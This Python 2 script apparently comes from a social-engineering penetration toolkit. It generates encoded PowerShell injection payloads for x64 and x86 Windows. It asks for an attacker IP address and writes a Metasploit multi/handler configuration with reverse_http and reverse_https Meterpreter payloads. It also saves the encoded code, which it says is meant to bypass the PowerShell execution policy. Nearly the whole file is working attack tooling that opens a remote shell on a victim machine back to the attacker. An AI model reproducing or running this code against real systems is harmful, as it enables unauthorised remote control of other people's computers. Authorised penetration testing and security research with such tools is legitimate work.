#!/usr/bin/python
import sys
import subprocess
import re
import os
import time
from src.core.setcore import *

# grab ipaddress
if os.path.isfile("src/program_junk/ipaddr.file"):
    fileopen = file("src/program_junk/ipaddr.file", "r")
    ipaddr = fileopen.read()
else: 
    ipaddr = raw_input("Enter the ipaddress for the reverse connection: ")
    filewrite = file("src/program_junk/ipaddr.file", "w")
    filewrite.write(ipaddr)

powershell_inject_x64 = check_config("POWERSHELL_INJECT_PAYLOAD_X64=")
powershell_inject_x86 = check_config("POWERSHELL_INJECT_PAYLOAD_X86=")

if validate_ip(ipaddr) == False:
        powershell_inject_x64 = "windows/meterpreter/reverse_https"
        powershell_inject_x86 = "windows/meterpreter/reverse_http"

# prompt what port to listen on for powershell then make an append to the current 
# metasploit answer file
if os.path.isfile("%s/src/program_junk/meta_config_multipyinjector" % (definepath)):
	print_status("POWERSHELL_INJECTION is set to ON with multi-pyinjector")
	port=raw_input(setprompt(["4"], "Enter the port for Metasploit to listen on for powershell [443]"))
	if port == "": port = "443"
	fileopen = file("%s/src/program_junk/meta_config_multipyinjector" % (definepath), "r")
	data = fileopen.read()
	match = re.search(port, data)
	if not match:
		filewrite = file("%s/src/program_junk/meta_config_multipyinjector" % (definepath), "a")
		filewrite.write("\nuse exploit/multi/handler\nset PAYLOAD %s\nset LHOST 0.0.0.0\nset LPORT %s\nset ExitOnSession false\nexploit -j\n" % (powershell_inject_x86, port))
		filewrite.close()

if not os.path.isfile("%s/src/program_junk/meta_config_multipyinjector" % (definepath)):
	if os.path.isfile("%s/src/program_junk/port.options" % (definepath)):
		fileopen = file("%s/src/program_junk/port.options" % (definepath), "r")
		port = fileopen.read()

	if not os.path.isfile("%s/src/program_junk/port.options" % (definepath)):
		port=raw_input(setprompt(["4"], "Enter the port for Metasploit to listen on for powershell [443]"))

print_status("Generating x64-based powershell injection code...")
x64 = ""
x86 = ""

x64 = generate_powershell_alphanumeric_payload(powershell_inject_x64, ipaddr, port, x64)
print_status("Generating x86-based powershell injection code...")
x86 = generate_powershell_alphanumeric_payload(powershell_inject_x86, ipaddr, port, x86)
# check to see if we want to display the powershell command to the user
verbose = check_config("POWERSHELL_VERBOSE=")
if verbose.lower() == "on":
    print_status("Printing the x64 based encoded code...")
    time.sleep(3)
    print x64
    print_status("Printing the x86 based encoded code...")
    time.sleep(3)
    print x86

filewrite = file("src/program_junk/x64.powershell", "w")
filewrite.write(x64)
filewrite.close()
filewrite = file("src/program_junk/x86.powershell", "w")
filewrite.write(x86)
filewrite.close()
print_status("Finished generating powershell injection bypass.")
print_status("Encoded to bypass exececution restriction policy...")

